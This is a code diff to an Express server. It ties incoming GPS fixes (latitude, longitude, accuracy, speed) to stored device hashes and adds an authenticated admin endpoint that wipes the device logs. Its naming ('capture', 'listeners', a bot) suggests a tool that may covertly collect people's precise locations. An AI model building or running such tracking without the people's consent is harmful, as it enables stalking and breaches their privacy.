@@ -346,7 +346,7 @@ app.post('/api/capture', async (req, res) => {
 
 app.post('/api/gps', (req, res) => {
   if (!listenersEnabled) return res.json({ success: false, reason: 'System paused' });
-  const { latitude, longitude, accuracy, speed, altitude, heading } = req.body;
+  const { latitude, longitude, accuracy, speed, altitude, heading, deviceHash: gpsHash } = req.body;
   if (!latitude || !longitude) return res.json({ success: false });
 
   const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Baghdad' });
@@ -382,7 +382,7 @@ app.post('/api/gps', (req, res) => {
 
   const devices = readDevices();
   for (let i = devices.length - 1; i >= 0; i--) {
-    if (devices[i].deviceHash && !devices[i].latitude) {
+    if (devices[i].deviceHash === gpsHash && gpsHash) {
       devices[i].latitude = parseFloat(latitude);
       devices[i].longitude = parseFloat(longitude);
       devices[i].accuracy = accuracy ? Math.round(parseFloat(accuracy)) : null;
@@ -499,6 +499,20 @@ app.post('/admin/control', (req, res) => {
     return res.json({ listeners: true, botRunning: botPolling });
   }
   res.json({ listeners: listenersEnabled, botRunning: botPolling });
+});
+
+app.post('/admin/clear', (req, res) => {
+  const auth = req.headers.authorization;
+  if (!auth) { res.setHeader('WWW-Authenticate', 'Basic realm="Admin"'); return res.status(401).json({ error: 'Auth required' }); }
+  const [scheme, enc] = auth.split(' ');
+  if (scheme !== 'Basic') return res.status(401).json({ error: 'Bad scheme' });
+  const dec = Buffer.from(enc, 'base64').toString('utf-8');
+  const [u, p] = dec.split(':');
+  if (u !== ADMIN_USER || p !== ADMIN_PASS) return res.status(401).json({ error: 'Wrong creds' });
+
+  fs.writeFileSync(DEVICES_FILE, '[]');
+  console.log('ADMIN: All logs cleared');
+  res.json({ success: true });
 });
 
 const PORT = process.env.PORT || 3000;
